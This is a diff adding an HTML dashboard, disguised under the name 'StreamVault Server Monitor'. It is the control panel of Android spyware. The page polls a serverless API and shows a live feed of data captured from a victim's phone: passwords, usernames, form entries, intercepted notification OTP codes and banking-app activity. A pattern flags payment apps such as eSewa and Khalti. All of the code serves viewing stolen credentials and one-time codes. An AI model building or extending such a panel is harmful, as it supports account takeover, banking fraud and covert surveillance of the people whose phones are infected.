@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>StreamVault — Server Monitor</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@400;500;700;800&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --bg: #0a0a0f;
+            --panel: #12121a;
+            --border: #1e1e2e;
+            --text: #e0e0e8;
+            --dim: #60606e;
+            --red: #ff4757;
+            --cyan: #00d4ff;
+            --green: #2ed573;
+            --yellow: #ffa502;
+            --purple: #a55eea;
+        }
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: 'Inter', sans-serif;
+            min-height: 100vh;
+        }
+        .header {
+            position: sticky; top: 0; z-index: 100;
+            background: rgba(10,10,15,0.95);
+            backdrop-filter: blur(12px);
+            border-bottom: 1px solid var(--border);
+            padding: 16px 24px;
+            display: flex; align-items: center; justify-content: space-between;
+        }
+        .header-left { display: flex; align-items: center; gap: 14px; }
+        .logo-icon { font-size: 24px; }
+        .header h1 {
+            font-family: 'Inter', sans-serif;
+            font-size: 18px; font-weight: 800;
+            background: linear-gradient(135deg, #00d4ff, #a55eea);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .header h1 span { color: var(--dim); font-weight: 400; font-size: 13px; margin-left: 10px; }
+        .status-badge {
+            display: flex; align-items: center; gap: 8px;
+            padding: 7px 16px;
+            background: rgba(46,213,115,0.1);
+            border: 1px solid rgba(46,213,115,0.3);
+            border-radius: 20px;
+            font-size: 12px; font-weight: 700;
+            color: var(--green);
+        }
+        .status-dot {
+            width: 8px; height: 8px; border-radius: 50%;
+            background: var(--green);
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; box-shadow: 0 0 8px var(--green); }
+            50% { opacity: 0.5; box-shadow: 0 0 4px var(--green); }
+        }
+        .container { max-width: 1100px; margin: 0 auto; padding: 24px; }
+        .stats-row { display: flex; gap: 16px; margin-bottom: 24px; flex-wrap: wrap; }
+        .stat-card {
+            flex: 1; min-width: 150px;
+            background: var(--panel);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 18px 20px;
+        }
+        .stat-card .label { font-size: 11px; font-weight: 600; color: var(--dim); text-transform: uppercase; letter-spacing: 0.5px; }
+        .stat-card .value { font-size: 28px; font-weight: 800; margin-top: 4px; }
+        #totalCaptures { color: var(--cyan); }
+        #totalPasswords { color: var(--red); }
+        #totalBanking { color: var(--yellow); }
+        #totalOtp { color: var(--purple); }
+
+        .feed-title {
+            font-size: 13px; font-weight: 700; color: var(--dim);
+            text-transform: uppercase; letter-spacing: 0.8px;
+            margin-bottom: 12px; display: flex; align-items: center; gap: 8px;
+        }
+        .feed-title::before {
+            content: ""; width: 4px; height: 14px; border-radius: 2px;
+            background: linear-gradient(180deg, #00d4ff, #a55eea);
+        }
+
+        .capture-card {
+            background: var(--panel);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 16px 18px;
+            margin-bottom: 12px;
+            animation: slideIn 0.3s ease;
+        }
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(-8px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .capture-header {
+            display: flex; align-items: center; justify-content: space-between;
+            margin-bottom: 10px;
+        }
+        .capture-app {
+            font-size: 14px; font-weight: 700;
+            display: flex; align-items: center; gap: 8px;
+        }
+        .capture-badge {
+            font-size: 9px; font-weight: 800;
+            text-transform: uppercase; letter-spacing: 0.5px;
+            padding: 3px 8px; border-radius: 4px;
+        }
+        .badge-creds    { background: rgba(255,71,87,0.15);   color: var(--red);    border: 1px solid rgba(255,71,87,0.3); }
+        .badge-banking  { background: rgba(255,165,2,0.15);   color: var(--yellow); border: 1px solid rgba(255,165,2,0.3); }
+        .badge-text     { background: rgba(0,212,255,0.12);   color: var(--cyan);   border: 1px solid rgba(0,212,255,0.25); }
+        .badge-otp      { background: rgba(165,94,234,0.15);  color: var(--purple); border: 1px solid rgba(165,94,234,0.3); }
+        .capture-time { font-size: 11px; color: var(--dim); font-family: 'JetBrains Mono', monospace; }
+        .capture-window { font-size: 11px; color: var(--dim); margin-bottom: 8px; font-family: 'JetBrains Mono', monospace; }
+
+        .field-row {
+            display: flex; align-items: center; gap: 10px;
+            padding: 8px 12px;
+            background: rgba(255,255,255,0.02);
+            border-radius: 6px;
+            margin-top: 6px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+        }
+        .field-label { color: var(--dim); min-width: 140px; font-weight: 500; }
+        .field-type  { font-size: 10px; font-weight: 700; padding: 2px 6px; border-radius: 3px; text-transform: uppercase; }
+        .type-password { background: rgba(255,71,87,0.15); color: var(--red); }
+        .type-phone    { background: rgba(0,212,255,0.12); color: var(--cyan); }
+        .type-email    { background: rgba(46,213,115,0.12); color: var(--green); }
+        .type-code     { background: rgba(165,94,234,0.12); color: var(--purple); }
+        .type-text     { background: rgba(255,255,255,0.06); color: var(--dim); }
+        .type-username { background: rgba(255,165,2,0.12); color: var(--yellow); }
+        .field-value { font-weight: 700; color: var(--text); word-break: break-all; }
+
+        .otp-display {
+            font-size: 22px; font-weight: 800;
+            font-family: 'JetBrains Mono', monospace;
+            color: var(--purple);
+            padding: 8px 16px;
+            background: rgba(165,94,234,0.08);
+            border-radius: 8px;
+            border: 1px solid rgba(165,94,234,0.2);
+            display: inline-block;
+            margin-top: 6px;
+            letter-spacing: 4px;
+        }
+
+        .empty {
+            text-align: center; padding: 60px 20px;
+            color: var(--dim); font-size: 14px;
+        }
+        .empty::before { content: "..."; font-size: 32px; display: block; margin-bottom: 12px; letter-spacing: 4px; }
+
+        .btn-clear {
+            background: rgba(255,71,87,0.1);
+            border: 1px solid rgba(255,71,87,0.25);
+            color: var(--red);
+            padding: 7px 16px;
+            border-radius: 8px;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .btn-clear:hover { background: rgba(255,71,87,0.2); }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <div class="header-left">
+        <span class="logo-icon">▶</span>
+        <h1>StreamVault <span>Server Monitor</span></h1>
+    </div>
+    <div style="display:flex;align-items:center;gap:14px">
+        <button class="btn-clear" onclick="clearData()">Clear</button>
+        <div class="status-badge">
+            <div class="status-dot"></div>
+            <span id="liveStatus">LIVE</span>
+        </div>
+    </div>
+</div>
+
+<div class="container">
+    <div class="stats-row">
+        <div class="stat-card">
+            <div class="label">Total Captures</div>
+            <div class="value" id="totalCaptures">0</div>
+        </div>
+        <div class="stat-card">
+            <div class="label">Passwords</div>
+            <div class="value" id="totalPasswords">0</div>
+        </div>
+        <div class="stat-card">
+            <div class="label">Banking Apps</div>
+            <div class="value" id="totalBanking">0</div>
+        </div>
+        <div class="stat-card">
+            <div class="label">OTP Codes</div>
+            <div class="value" id="totalOtp">0</div>
+        </div>
+    </div>
+
+    <div class="feed-title">Live Capture Feed</div>
+    <div id="feed">
+        <div class="empty">Waiting for data from the phone...</div>
+    </div>
+</div>
+
+<script>
+const API = "/.netlify/functions/api";
+let lastCount = 0;
+
+async function fetchData() {
+    try {
+        const res = await fetch(API);
+        const data = await res.json();
+        const events = data.events || [];
+
+        let pw = 0, banking = 0, otp = 0;
+        events.forEach(e => {
+            if (e.type === "otp") otp++;
+            if (e.fields) {
+                e.fields.forEach(f => {
+                    if (f.type === "password") pw++;
+                });
+            }
+            if (e.app && /esewa|khalti|bank|pay|wallet|finance/i.test(e.app)) banking++;
+        });
+
+        document.getElementById("totalCaptures").textContent = events.length;
+        document.getElementById("totalPasswords").textContent = pw;
+        document.getElementById("totalBanking").textContent = banking;
+        document.getElementById("totalOtp").textContent = otp;
+
+        if (events.length !== lastCount) {
+            renderFeed(events);
+            lastCount = events.length;
+        }
+    } catch (e) {
+        document.getElementById("liveStatus").textContent = "OFFLINE";
+    }
+}
+
+function renderFeed(events) {
+    const feed = document.getElementById("feed");
+    if (events.length === 0) {
+        feed.innerHTML = '<div class="empty">Waiting for data from the phone...</div>';
+        return;
+    }
+    feed.innerHTML = events.map(e => renderCard(e)).join("");
+}
+
+function renderCard(e) {
+    const ts = new Date(e.ts).toLocaleTimeString();
+    const isOtp = e.type === "otp";
+
+    if (isOtp) {
+        return `
+        <div class="capture-card">
+            <div class="capture-header">
+                <div class="capture-app">
+                    <span class="capture-badge badge-otp">OTP</span>
+                    ${esc(e.package || "unknown")}
+                </div>
+                <div class="capture-time">${ts}</div>
+            </div>
+            ${e.title ? `<div class="capture-window">Notification: ${esc(e.title)}</div>` : ""}
+            ${e.text ? `<div class="capture-window">Text: ${esc(e.text)}</div>` : ""}
+            <div class="otp-display">${esc(e.otp_code || "??????")}</div>
+        </div>`;
+    }
+
+    const fields = e.fields || [];
+    const hasPassword = fields.some(f => f.type === "password");
+    const isBanking = /esewa|khalti|bank|pay|wallet|finance/i.test(e.app || "");
+    const badge = hasPassword ? "badge-creds" : (isBanking ? "badge-banking" : "badge-text");
+    const badgeText = hasPassword ? "CREDENTIALS" : (isBanking ? "BANKING" : "TEXT");
+
+    return `
+    <div class="capture-card">
+        <div class="capture-header">
+            <div class="capture-app">
+                <span class="capture-badge ${badge}">${badgeText}</span>
+                ${esc(e.app || "unknown")}
+            </div>
+            <div class="capture-time">${ts}</div>
+        </div>
+        ${e.window ? `<div class="capture-window">pkg: ${esc(e.window)}</div>` : ""}
+        ${fields.map(f => `
+            <div class="field-row">
+                <span class="field-label">${esc(f.label || "?")}</span>
+                <span class="field-type type-${esc(f.type || "text")}">${esc(f.type || "text")}</span>
+                <span class="field-value">${esc(f.value || "(empty)")}</span>
+            </div>
+        `).join("")}
+    </div>`;
+}
+
+function esc(s) {
+    return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":"&#39;"})[c]);
+}
+
+async function clearData() {
+    try {
+        await fetch(API, { method: "POST", body: JSON.stringify({ type: "clear" }) });
+        lastCount = 0;
+        fetchData();
+    } catch(e) {}
+}
+
+fetchData();
+setInterval(fetchData, 2000);
+</script>
+</body>
+</html>
